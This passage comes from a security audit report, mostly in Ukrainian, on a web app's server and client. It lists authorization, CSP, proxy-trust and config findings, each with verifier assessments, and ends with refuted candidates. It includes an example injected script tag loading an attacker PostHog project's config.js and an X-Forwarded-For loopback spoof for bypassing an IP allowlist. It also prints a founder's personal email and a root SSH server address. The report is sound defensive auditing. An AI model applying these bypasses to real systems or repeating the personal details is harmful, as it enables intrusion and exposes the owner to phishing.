psql: pg_policies=0, rls-таблиць=0. apps/server/src/http/crossUserIsolation.test.ts:168 TODO_UNCOVERED (72 записи). docs/open-work.md:93 має рядок «rls-ai-tables-and-isolation-gate.md | In progress (Стадії 1-3 з 4)».
```

### [info] runWithSubjectContext відкривається за замовчуванням: будь-який subject без `u:&lt;id&gt;` отримує bypass; purgeUserData ставить контекст вручну без захисту зʼєднання

- **ID:** `server-static/idor-rls#6` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Серйозність від шукача:** low (переоцінено верифікатором)
- **Де:** apps/server/src/dbContext.ts:99-115; apps/server/src/modules/me/dataRights.ts:657-663,745-750
- **Вплив:** Після ввімкнення політик (Стадія 4) регресія у формуванні subject_key дасть повний доступ до ai_usage_daily замість помилки, тобто fail-open замість задекларованого в спеці fail-closed (A3). Ручний set_config у purgeUserData дублює helper без його гарантій.
- **Що зробити:** Робити bypass лише для явного allowlist префіксів (`ip:`, `provider:`, `n8n:`), а для всього іншого кидати помилку. У purgeUserData використати runWithUserContext(pool, userId, fn) замість ручних BEGIN і set_config.

**Докази:**

```text
dbContext.ts: `if (subjectKey.startsWith("u:") && subjectKey.length > 2) return runWithUserContext(...); return runWithBypassContext(pool, fn);` - помилково сформований ключ (голий userId, `user:...`, порожній `u:`) мовчки дає `app.bypass='on'`. dataRights.ts purgeUserData: `await client.query("SELECT set_config('app.user_id', $1, true)", [userId]);` у власній транзакції, а в catch `await client.query("ROLLBACK"); ... finally { client.release(); }`: якщо ROLLBACK кидає, зʼєднання повертається в пул без release(true), на відміну від runInTransaction (dbContext.ts:45-54).
```

**Відтворення:**

```text
Код-рев'ю: усі поточні виклики формують `u:${id}` коректно (aiQuota.ts:277, usdCap.ts:125-128, anthropicUsageStore.ts:124-127), тож дефект латентний.
```

**Верифікатор:**

```text
Код збігається з описом. runWithSubjectContext віддає bypass для будь-якого ключа, що не має форми `u:<непорожнє>`, а purgeUserData ставить set_config вручну, і `ROLLBACK` у catch там без обгортки. Проте впливу немає, і після Стадії 4 він теж мінімальний. (1) Bypass для не-`u:` ключів (ip:, provider, n8n:) прямо закладений у спеці § A1/A4. Усі чотири місця виклику (aiQuota.subjectForUser, usdCap.subjectFor, anthropicUsageStore) формують `u:${id}` коректно. До того ж запити всередині самі фільтрують `WHERE subject_key = $1`, тож навіть хибний bypass не відкриває чужих рядків. (2) Частина про purgeUserData здебільшого спростована. set_config(..., true) діє в межах транзакції і не протікає після ROLLBACK чи COMMIT. pg-pool `_release` сам знищує клієнта з `!client._queryable || client._ending` (node_modules/pg-pool/index.js:392), тож обірване з'єднання в пул не повертається. Живе з'єднання всередині транзакції повернулося б у пул лише тоді, коли ROLLBACK кидає на живому з'єднанні, а практично такого не буває. Лишається одне: оригінальна помилка підміняється помилкою ROLLBACK. Severity знижую до info: це латентний стиль для майбутнього, а не дефект.
```

**Додаткові докази верифікатора:**

```text
apps/server/src/dbContext.ts:99-115. Виклики: usdCap.ts:126-128 (`id ? \`u:${id}\` : null`), aiQuota.ts:277 (`u:${userId}`), anthropicUsageStore.ts:124-127 (лише за непорожнього userId). У pg-pool _release перевірка `if (err || this.ending || !client._queryable || client._ending ...) return this._remove(...)`. dataRights.ts:657-663 — BEGIN + set_config, :745-750 — catch ROLLBACK без .catch, finally client.release().
```

### [info] Публічне репо розкриває особисті email засновника, факт що це прод-акаунт з реальними фінансами, і root-SSH адресу прод-сервера (ключів/токенів не знайдено)

- **ID:** `server-static/privacy-logging#13` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** docs/work/specs/planning/product-knowledge-backlog.md:1722; scripts/docs/author-map.json:5-7; docs/governance/governance/external-link-allowlist.json:135; AGENTS.md:228
- **Вплив:** Полегшує таргетований фішинг/credential stuffing саме на акаунт із реальними банківськими підключеннями та розвідку SSH-поверхні сервера.
- **Що зробити:** Прибрати особисту адресу і згадку про реальні фінанси з публічних доків; не публікувати root@IP (використати SSH-alias), закрити SSH для root/пароля, якщо ще не зроблено.

**Докази:**

```text
product-knowledge-backlog.md:1722: «дозвіл на `<email власника>` є, але 11 тестових записів у справжніх фінансах власника...»; AGENTS.md:228: «bare-дзеркало `root@167.233.98.92:/srv/git/sergeant.git`». git grep по відстежуваних файлах і `git log -p --all -G` (396 комітів, shallow) на sk-ant-/sk-or-v1-/ghp_/AKIA/gsk_/re_/whsec_/Telegram-токени/Sentry DSN/postgres-URL з паролями — лише плейсхолдери й тестові фікстури.
```

**Відтворення:**

```text
git grep -n -I -E 'gmail\.com|167\.233\.98\.92'
```

**Верифікатор:**

```text
Факти наявні у відстежуваних файлах. product-knowledge-backlog.md:1722 називає `<email власника>` і «справжні фінанси власника». scripts/docs/author-map.json:5-7 містить дві gmail-адреси засновника. AGENTS.md:228 містить `root@167.233.98.92:/srv/git/sergeant.git`. Репо публічне з 2026-09-30 (AGENTS.md, ADR-0101). Приріст розкриття малий. Ті самі адреси вже публічні в метаданих git-комітів: `git log --format=%ae` дає 86 комітів від <email власника> і 86 від ще однієї gmail-адреси. IP бекенд-хоста фактично видно з DNS API. Новим лишається лише контекст «цей акаунт підключений до реальних фінансів» і те, що SSH-користувач git-дзеркала — root. Перше суперечить власному правилу AGENTS.md «реальні user ID, фінансову топологію ... не комітьте». Секретів не знайдено. Severity info коректна.
```

**Додаткові докази верифікатора:**

```text
git grep -n -I -E 'gmail\.com|167\.233\.98\.92' → AGENTS.md:228, product-knowledge-backlog.md:1722, scripts/docs/author-map.json:5,7 (+ тестова фікстура bump-last-validated.test.mjs:49). git log --format='%ae' | sort | uniq -c → 86 <email власника>, 86 dimastahov16012003@gmail.com. Ні в аудитах, ні в open-work.md це не зафіксовано (docs-governance-audit:89 лише цитує pushurl дзеркала в іншому контексті).
```

### [info] Privat-проксі залежить від ключа MONO_TOKEN_ENC_KEY, який на старті перевіряється лише при MONO_WEBHOOK_ENABLED, і падає з 500 навіть для непідключених користувачів

- **ID:** `server-static/reliability-ops#11` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Серйозність від шукача:** low (переоцінено верифікатором)
- **Де:** apps/server/src/modules/mono/privatStore.ts:82-95 (ring перевіряється ДО SELECT); apps/server/src/modules/mono/privat.ts:50-60; apps/server/src/env/env.ts:942-963 (асерт лише під MONO_WEBHOOK_ENABLED, дефолт false: env.ts:334-337)
- **Вплив:** Якщо в будь-якому середовищі MONO_WEBHOOK_ENABLED вимкнено і ключ не задано, сервер стартує «здоровим», а вся інтеграція ПриватБанку віддає 500 з logger.error. У проді проблема не проявиться, якщо Mono-вебхук увімкнений (тоді ключ асертиться).
- **Що зробити:** Асертити MONO_TOKEN_ENC_KEY[S] у проді безумовно (або під окремим прапорцем Privat). У loadPrivatCredentials спочатку робити SELECT і повертати null, якщо рядка немає, а ключ вимагати лише для розшифрування.

**Докази:**

```text
`const ring = monoKeyRing(); if (!ring) { throw new Error("Missing bank-token encryption key"); }` стоїть перед SELECT, хоча докстрінг каже «Throws only when a row exists but cannot be decrypted». Локально (ключа немає): GET /api/privat/status -> 200 {connected:false}, а GET /api/privat?path=/statements/balance/final для непідключеного користувача -> 500 {"error":"Не вдалося прочитати credentials"} (очікувано 409 PRIVAT_NOT_CONNECTED). У логах 10 рядків privat_credentials_decrypt_failed.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-reliability-ops/probe3.mjs
```

**Верифікатор:**

```text
Reproduced live. As userB, GET /api/privat/status returns 200 {connected:false}, and GET /api/privat?path=/statements/balance/final returns 500 {error:'Не вдалося прочитати credentials'}, logged as privat_credentials_decrypt_failed. The reason is that loadPrivatCredentials throws on the missing key ring before its SELECT (privatStore.ts:92-95), which contradicts its own docstring ('Throws only when a row exists'). The startup assert for MONO_TOKEN_ENC_KEY runs only under MONO_WEBHOOK_ENABLED (env.ts:942), and that flag defaults to false. The real-world impact is smaller than claimed, so I downgraded it to info. The web client calls the proxy only after status.connected is true (usePrivatbank.ts:560-563), so users who never connected never reach the 500 from the UI. Without the key, savePrivatCredentials (privatStore.ts:50-53) and the Mono connection code (connection.ts:91) fail as well, so in such an environment the bank integrations are simply off, and Privat is not a special case. What remains is a 500 instead of 409 for direct API callers, misleading 'decrypt_failed' error logs, and a docstring that does not match the code. One side note: in a key-less environment the legacy-creds migration (usePrivatbank.ts:545-556) calls clearLegacyCreds() even after connect fails.
```

**Додаткові докази верифікатора:**

```text
Script: <scratch>/agents/verify-server-static-reliability-ops/r2-privat.mjs, output '/api/privat/status 200 {connected:false}' and '/api/privat?path=... 500'. feature-flags.md:90 lists MONO_WEBHOOK_ENABLED with default false.
```

### [info] Залишки Railway та ghcr у рантайм-конфігу й коментарях: role "railway" у логах, хибні пояснення про healthcheck і build-arg у Dockerfile, плаваючі теги базових образів

- **ID:** `server-static/reliability-ops#13` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/config.ts:11-13,40-43 (`role: mode` = "railway"); apps/server/src/index.ts:1-3, 715-719; apps/server/src/env/betterAuthEnv.ts:29,43 (підказки про Railway, railway-vercel.md); Dockerfile.api:20 (nodejs20-debian12 у шапці при фактичному nodejs22-debian13 на :213), 50-58 (HEALTHCHECK «тягне готовий образ із ghcr»), 224/237 (`busybox:stable-musl`), 213 (`:nonroot` без digest)
- **Вплив:** Оператор, що діагностує інцидент, бачить у логах і повідомленнях про помилки неіснуючу платформу (ADR-0074), а коментарі Dockerfile дають неправильну модель healthcheck і build id (див. знахідку про GIT_SHA). Плаваючі теги роблять збірку невідтворюваною і відкривають ланцюг постачання для бінарника, що отримує DB-креденшели.
- **Що зробити:** Перейменувати ServerMode/role на "coolify" або прибрати поле; оновити підказки й коментарі Dockerfile; запінити `busybox:stable-musl` і distroless-образ за digest (Renovate оновлюватиме).

**Докази:**

```text
Живий лог: `{"msg":"server_listening","role":"railway","port":3000}`. Dockerfile:54: «Тут він тягне готовий образ із ghcr, тож custom_healthcheck_found лишається false», хоча за deploy-api.yml:17-18 Coolify тепер збирає Dockerfile з репозиторію, тобто Dockerfile-івський HEALTHCHECK уже враховувався б. Busybox із плаваючого тегу стає /bin/sh, під яким ENTRYPOINT запускає міграції з доступом до DATABASE_URL.
```

**Відтворення:**

```text
grep server_listening у логу; прочитати вказані рядки Dockerfile.api.
```

**Верифікатор:**

```text
All the points check out. config.ts:6-13 hardcodes ServerMode 'railway', and the live log shows {msg:'server_listening', role:'railway'}. index.ts:1-3 and betterAuthEnv.ts:29,43 still mention Railway, and docs/engineering/integrations/railway-vercel.md still exists. In Dockerfile.api, the header at line 20 says nodejs20-debian12 while line 213 uses nodejs22-debian13. Lines 54-56 ('тягне готовий образ із ghcr') and 248-252 (deploy-api.yml passes --build-arg GIT_SHA) are stale: deploy-api.yml:17-18 now says Coolify clones main and builds Dockerfile.api, with no ghcr. The base images busybox:stable-musl (lines 224/237) and distroless :nonroot are not pinned by digest, and renovate.json sets pinDigests only for GitHub Actions and the pgvector image. None of this affects runtime behaviour. Coolify still applies its own healthcheck because Dockerfile.api has no HEALTHCHECK at all. So this is documentation drift plus a modest reproducibility and supply-chain hardening point (official Docker Hub images). Info is correct.
```

**Додаткові докази верифікатора:**

```text
Live log line: {"msg":"server_listening","role":"railway","port":3000}. grep finds 'ghcr' in Dockerfile.api:54,249 and in comments in sentry.ts:205, buildIdHeader.ts:11 and metrics/registry.ts:84. The docs-governance audit 2026-09-23 (DG on stale ghcr/pre_deployment_command docs) covers AGENTS.md, skills and runbooks but not these Dockerfile and config.ts code-level residues, so it is related but not the same issue.
```

### [info] CSP обох сайтів дозволяє script-src https://*.posthog.com: config.js чужого PostHog-проєкту стає гаджетом обходу CSP

- **ID:** `client-static/landing-shell-mobile#9` · **Вердикт:** сумнівно · **Категорія:** `xss` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Серйозність від шукача:** low (переоцінено верифікатором)
- **Де:** apps/landing/vercel.json (Content-Security-Policy: script-src 'self' https://_.posthog.com); apps/web/vercel.json (Content-Security-Policy: script-src 'self' 'wasm-unsafe-eval' https://_.posthog.com …)
- **Вплив:** Defense-in-depth: за наявності будь-якої HTML-інʼєкції (на web: markdown AI-чату, назви тощо) CSP не зупинить &lt;script src="https://eu-assets.i.posthog.com/array/phc_ATTACKER/config.js"&gt;. Ризик реалізується лише разом з іншою вразливістю.
- **Що зробити:** Увімкнути в posthog-js disable_external_dependency_loading: true (розширення бандлити або вимкнути) і прибрати *.posthog.com зі script-src, лишивши тільки connect-src. Або проксіювати PostHog через власний домен і дозволити лише його.

**Докази:**

```text
Прод-лендінг виконує `https://eu-assets.i.posthog.com/array/<project_token>/config.js`, тобто JS, що формує сервер PostHog за токеном проєкту (у ньому `siteApps: [...]`, код site apps/destinations). Шлях параметризований токеном, тож зловмисник із власним безкоштовним проєктом отримує виконуваний JS на дозволеному хості. Плюс підвантажуються static/surveys.js, dead-clicks-autocapture.js, web-vitals.js.
```

**Відтворення:**

```text
node <scratch>/agents/client-static-landing-shell-mobile/landing-browser.mjs / (список зовнішніх script-запитів); прочитати CSP у обох vercel.json.
```

**Верифікатор:**

```text
The CSP fact is true. Both vercel.json files allow `script-src https://*.posthog.com`, and docs/work/specs/security-hardening/C2-frontend-csp.md documents this as intentional, because PostHog lazy-loads surveys, web-vitals, dead-clicks and the replay recorder. The specific bypass gadget described does not work, though. I captured the real config.js from prod (`eu-assets.i.posthog.com/array/phc_A8ds.../config.js`, 1256 bytes). It is an IIFE whose only effect is `window._POSTHOG_REMOTE_CONFIG[token] = {config:{...}, siteApps: []}`, which assigns data and runs no code. In posthog-js 1.399.2 (dist/module.js), site-app loaders are read only from `_POSTHOG_REMOTE_CONFIG[this._instance.config.token].siteApps`, meaning only for the page's own token. They run only when `opt_in_site_apps` is true (`get isEnabled(){return!!this._instance.config.opt_in_site_apps}`), and neither apps/landing/src/lib/analytics.ts nor apps/web/src/core/observability/posthog.ts sets it. An injected `<script src=.../array/phc_ATTACKER/config.js>` would therefore only add an unused object under the attacker's token and execute no attacker-controlled code. I could not rule out that some other endpoint on *.posthog.com could serve top-level-executing, attacker-authored JS (for example legacy site-app endpoints). Testing that would require creating a PostHog project, which is outside this audit's scope. The weakness that remains is the generic CSP-evaluator note that wildcard third-party hosts in script-src are weaker than nonces or hashes. That is a defense-in-depth observation, not a demonstrated bypass.
```

**Додаткові докази верифікатора:**

```text
Verifier script verify-client-static-landing-shell-mobile/phcfg.mjs saved prod config.js to config.js.txt; its content is `(function(){ window._POSTHOG_REMOTE_CONFIG = ...; window._POSTHOG_REMOTE_CONFIG['phc_A8dsjhF6...'] = { config: {...}, siteApps: [] } })();`. No CSP violations on the landing. In node_modules/posthog-js/dist/module.js, the siteApps class reads `siteAppLoaders` from `_POSTHOG_REMOTE_CONFIG[this._instance.config.token]` and is gated on `opt_in_site_apps`. `grep opt_in_site_apps apps/` finds nothing.
```

### [info] requireInternalIp довіряє req.ip з X-Forwarded-For (trust proxy=1) і завжди пропускає loopback: при прямому доступі до порту allowlist обходиться

- **ID:** `server-static-redo/route-authz#9` · **Вердикт:** сумнівно · **Категорія:** `config` · **Лейн:** Статика сервера · повтор route-authz
- **Стан:** відкрито
- **Серйозність від шукача:** low (переоцінено верифікатором)
- **Уже відстежується:** docs/work/specs/audits/security-comprehensive-2026-08-04.md
- **Де:** apps/server/src/http/requireInternalIp.ts:119 (LOOPBACK_DEFAULTS), 166, 248-250; apps/server/src/http/rateLimit.ts:92-97 (getIp = req.ip); apps/server/src/app.ts:114 + config.ts (TRUST_PROXY за замовчуванням 1); Dockerfile.api:289 (EXPOSE 3000)
- **Вплив:** Мережевий шар defense-in-depth для internal/push-маршрутів зводиться нанівець за типової помилки конфігурації. Секрет лишається єдиним бар'єром, а rate-limit per-IP обходиться ротацією заголовка.
- **Що зробити:** Loopback перевіряти за req.socket.remoteAddress, а не за req.ip. TRUST_PROXY задавати як CIDR мережі Traefik (Docker network), а не числом hop-ів. Переконатися, що порт 3000 не опубліковано на хості (у Coolify без Ports Mappings).

**Докази:**

```text
Локально (прямий доступ, trust proxy=1) запит з X-Forwarded-For: 10.11.12.13 записано з іншим ipHash (551ddf8b5dff17e9 проти 12ca17b49af22894 у решти 267 node-запитів), тобто req.ip контролює клієнт. За Traefik, який дописує реальну IP, це безпечно. Але будь-який шлях до контейнера в обхід Traefik (опублікований порт 3000 на 167.233.98.92, помилковий TRUST_PROXY>фактичних hop-ів) дозволяє пройти IP-гейт /api/push/send і /api/internal з `X-Forwarded-For: 127.0.0.1` і обходити per-IP лімітери.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-redo-route-authz/probe7.mjs, потім grep ipHash у server.log.
```

**Верифікатор:**

```text
Механізм підтверджено. requireInternalIp бере getIp(req) = req.ip, тобто з урахуванням trust proxy (requireInternalIp.ts:213; rateLimit.ts:92-97). LOOPBACK_DEFAULTS 127.0.0.1/::1 додаються завжди (рядки 84, 131). TRUST_PROXY за замовчуванням 1 (app.ts:109-114, config.ts). При прямому з'єднанні з портом клієнт керує req.ip через X-Forwarded-For. Номери рядків у знахідці не збігаються з кодом (119/166/248 замість 84/187/213). Але сама вада умовна, і її передумова не доведена. Вибір req.ip замість socket.remoteAddress описаний у докстрінгу як навмисний (рядки 25-32). Прод іде через Coolify Traefik (ADR-0074). Опублікування порту 3000 на хості нічим не підтверджено: `EXPOSE` у Dockerfile порт не публікує, Ports Mappings у Coolify за замовчуванням порожні, а згадки `3000:3000` у доках стосуються OpenHands у Deprecated-документі. Якщо з'єднання все ж прямі, атакувальник підробить будь-яку IP з allowlist, не лише loopback. Тому корінь проблеми в калібруванні TRUST_PROXY, а воно вже відстежується. Специфічний внесок цієї знахідки (loopback перевіряти за сокетом) — корисне посилення, а не вразливість. Для /api/push/send і /api/internal далі потрібен валідний секрет.
```

**Додаткові докази верифікатора:**

```text
node <scratch>/agents/verify-server-static-redo-route-authz/xff.mjs: в server.log UA 'vfy-xff-spoof-127' (XFF 127.0.0.1) має ipHash 12ca17b49af22894, той самий, що й 'vfy-xff-plain'. 'vfy-xff-spoof-8888' (XFF 8.8.8.8) має ipHash 838c4c2573848f58. Отже, при прямому доступі req.ip задає заголовок. Це стандартна поведінка Express при trust proxy=1 і прямому з'єднанні. ADR-0074 і security-comprehensive §1.1 позначають калібрування TRUST_PROXY під Traefik як TBD.
```

## Спростовані кандидати

Верифікатор відкинув ці кандидати. Вони тут, щоб наступні аудити не подавали їх повторно.

- `server-static/gap-blocked-input-route-findings#2`: Заголовок `X-Api-Secret` (будь-яке значення) обходить глобальний CSRF-гейт на всіх state-changing маршрутах, що самі не викликають requireApiSecret. Причина: Сама поведінка відтворюється: PATCH /api/me/preferences без XRW → 403, з `X-Api-Secret: x` → 200. Безпекового наслідку в цього немає. Захист requireCsrfHeader тримається на тому, що нестандартний заголовок змушує браузер робити preflight, а preflight обмежений CORS-allowlist. X-Api-Secret теж не входить у CORS-safelisted, тож крос-сайтова сторінка без preflight його не надішле. На preflight apiCor
- `server-static/gap-silpo-and-shared-product-catalog#11`: Refresh може обміняти вже ротований refresh-токен: перед обміном рядок не перечитується, а при reuse-detection у Сільпо це відкликає всю родину токенів. Причина: Кодовий факт правильний: після завершення single-flight (`inFlightRefresh.delete` у finally) запізнілий виклик з тим самим R1 знову POST-ить його на /token. Але шкода, на якій тримається знахідка, спирається на неперевірене припущення, і докази свідчать проти нього. (1) Живий metadata Сільпо (`GET https://mcp.silpo.ua/.well-known/oauth-authorization-server`) збігається з виводом бібліотеки cloudfl
- `server-static/webhooks-billing-quota#1`: Колбеки LiqPay і вебхуки Plata йдуть на домен веб-застосунку (Vercel без проксі /api), а не на API. Причина: Головна теза, що Vercel не проксує /api, хибна. apps/web/middleware.ts — це Vercel Edge Middleware з `matcher: "/api/:path*"`, і він проксує КОЖЕН /api/* запит на `BACKEND_URL`. Метод і сире тіло (arrayBuffer) передаються як є, отже доходять і form-urlencoded тіло LiqPay, і ECDSA-підписаний raw JSON з X-Sign від monobank. Rewrite у vercel.json навмисно виключає `api/`, щоб такі запити йшли в middl
- `browser-surfaces/hub-shell#7`: Завершена сесія («Активні сесії» → «Завершити», тост «Сесію завершено») ще ~5 хвилин читає дані через /api/v1/me і /api/v2/sync/pull. Причина: Поведінка реальна, але це задокументований і прийнятий компроміс, а не новий дефект. ADR-0017 § ADR-7.2 («Session model: 7-day stateful + 5-min cookie cache») прямо фіксує: «Trade-off cookieCache: revoke-затримка до 5 хв». requireSession.ts і me.ts:89 називають 5-хвилинне вікно прийнятним для звичайних роутів, а для чутливих поверхонь (GET /api/me/export, DELETE /api/me, mono/privat connect) уже с
- `server-static-redo/route-authz#11`: CSRF-гейт пропускає будь-який запит з непорожнім X-Api-Secret, незалежно від маршруту. Причина: Факти в коді правильні. requireCsrfHeader.ts:146-149 пропускає будь-який state-changing запит з непорожнім X-Api-Secret. DEFAULT_ALLOW_HEADERS у cors.ts містить X-Api-Secret, а ALLOW_HEADERS у apiCors.ts:30-31 його не містить. Але заявлений вплив неправильний. X-Api-Secret, як і X-Requested-With, не входить у CORS-safelisted заголовки, тож будь-який крос-оріджин запит із ним вимагає preflight. Pre
